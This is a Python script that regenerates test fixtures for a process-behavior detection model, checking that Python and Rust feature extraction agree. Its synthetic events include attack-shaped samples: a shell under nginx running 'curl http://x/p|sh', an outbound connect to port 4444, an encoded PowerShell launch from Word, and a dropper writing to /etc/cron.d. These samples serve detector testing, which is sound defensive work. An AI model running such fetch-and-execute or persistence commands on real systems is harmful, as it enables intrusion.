"""Regenerates the T1 behavior-vector parity fixture (issue #617):

    ml/tests/fixtures/t1_events.jsonl   (schema::Event JSON-Lines: identity under `meta`,
                                         lineage beside the command line)
    ml/tests/fixtures/t1_golden.jsonl   ({pid, process_generation, features[23]} per
                                         process incarnation)

The T1 vector is cmdline (9) + correlation (8) + lineage (6). Python builds it with
`synthaea_ml.data.behavior_dataset.records_from_events` + `synthaea_ml.features.t1`; Rust
builds it with `ml::features::t1::extract_features` over a `correlator::EventBus`. A model
trained on one only scores consistently on the other if both give these vectors.

The capture is crafted to pin the cases that make the 23-feature vector different from
three independent ones: a web server parent, a recycled pid (two incarnations, the first
of which connected out and must not leak into the second), no generation stamps, no
lineage, a Windows-style exec with no argv (flat cmdline), and an incarnation with two
execs (the most recent one supplies cmdline and lineage). Every event sits inside one 60 s
window, so `EventBus` eviction and the dataset builder's per-incarnation window agree.

Run from `ml/tests/fixtures/` (stdlib plus the package on the path):

    python3 gen_t1_parity.py

Regenerate only on a deliberate change to the T1 layout, a feature definition or the wire
format: never to paper over a red parity test.
"""

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from synthaea_ml.data.behavior_dataset import load_records
from synthaea_ml.features import t1

OUT = Path(__file__).resolve().parent
S = 1_000_000_000
BASE = 1_756_900_000 * S


def meta(pid, ppid, t_ns, comm, generation=None):
    m = {
        "pid": pid,
        "ppid": ppid,
        "user": {"os": "unix", "uid": 1000, "gid": 1000},
        "timestamp_ns": BASE + t_ns,
        "comm": comm,
    }
    if generation is not None:
        m["process_generation"] = generation
    return m


def exec_ev(pid, ppid, t_ns, comm, image, argv, parent=None, generation=None, cmdline=None):
    ev = {
        "type": "exec",
        "meta": meta(pid, ppid, t_ns, comm, generation),
        "image_path": image,
        "cmdline": cmdline if cmdline is not None else " ".join(argv),
        "argv": argv,
    }
    if parent is not None:
        ev["parent_comm"], ev["parent_image_path"] = parent
    return ev


def connect_ev(pid, ppid, t_ns, comm, daddr, dport, generation=None):
    return {
        "type": "connect",
        "meta": meta(pid, ppid, t_ns, comm, generation),
        "daddr": daddr,
        "dport": dport,
    }


def file_open_ev(pid, ppid, t_ns, comm, path, flags, generation=None):
    return {
        "type": "file_open",
        "meta": meta(pid, ppid, t_ns, comm, generation),
        "path": path,
        "flags": flags,
    }


O_WRONLY_CREAT = 0o101

EVENTS = [
    # A webshell-shaped chain: web server parent, spawn + connect + file write.
    exec_ev(100, 50, 1 * S, "sh", "/bin/sh", ["sh", "-c", "id; curl http://x/p|sh"],
            parent=("nginx", "/usr/sbin/nginx"), generation=1),
    connect_ev(100, 50, 2 * S, "sh", "203.0.113.7", 4444, generation=1),
    file_open_ev(100, 50, 3 * S, "sh", "/tmp/p", O_WRONLY_CREAT, generation=1),
    # The same pid recycled: a quiet `ls` under bash. Its first life connected out and
    # wrote a file; none of that may reach this incarnation.
    exec_ev(100, 60, 10 * S, "ls", "/usr/bin/ls", ["ls", "-la"],
            parent=("bash", "/usr/bin/bash"), generation=2),
    # No generation stamps anywhere (an older sensor): pid-only behavior.
    exec_ev(200, 1, 11 * S, "cat", "/usr/bin/cat", ["cat", "/etc/hostname"],
            parent=("systemd", "/usr/lib/systemd/systemd")),
    # No lineage at all (a sensor without parent tracking).
    exec_ev(300, 1, 12 * S, "whoami", "/usr/bin/whoami", ["whoami"]),
    # Windows-style exec: no argv, the flat cmdline is what the model reads.
    exec_ev(400, 1, 13 * S, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            [], parent=("winword.exe", "C:\\Program Files\\Microsoft Office\\winword.exe"),
            cmdline="powershell.exe -enc SQBFAFgA"),
    connect_ev(400, 1, 14 * S, "powershell.exe", "198.51.100.9", 443),
    # Two execs in one incarnation: the later one supplies cmdline and lineage.
    exec_ev(500, 1, 15 * S, "dropper", "/tmp/dropper", ["/tmp/dropper"],
            parent=("bash", "/usr/bin/bash")),
    exec_ev(500, 1, 16 * S, "payload", "/dev/shm/payload", ["/dev/shm/payload", "--run"],
            parent=("dropper", "/tmp/dropper")),
    file_open_ev(500, 1, 17 * S, "payload", "/etc/cron.d/x", O_WRONLY_CREAT),
]

events_path = OUT / "t1_events.jsonl"
events_path.write_text("".join(json.dumps(e) + "\n" for e in EVENTS), encoding="utf-8")

records = load_records(events_path)
rows = [
    {
        "pid": r["pid"],
        "process_generation": r.get("process_generation"),
        "features": t1.extract_features(r),
    }
    for r in records
]
golden_path = OUT / "t1_golden.jsonl"
golden_path.write_text("".join(json.dumps(r) + "\n" for r in rows), encoding="utf-8")

print(f"wrote {events_path.name} ({len(EVENTS)} events) and {golden_path.name} "
      f"({len(rows)} incarnation vectors)")
for r in rows:
    print(f"  pid={r['pid']:<4} gen={r['process_generation']!s:<4} {r['features']}")
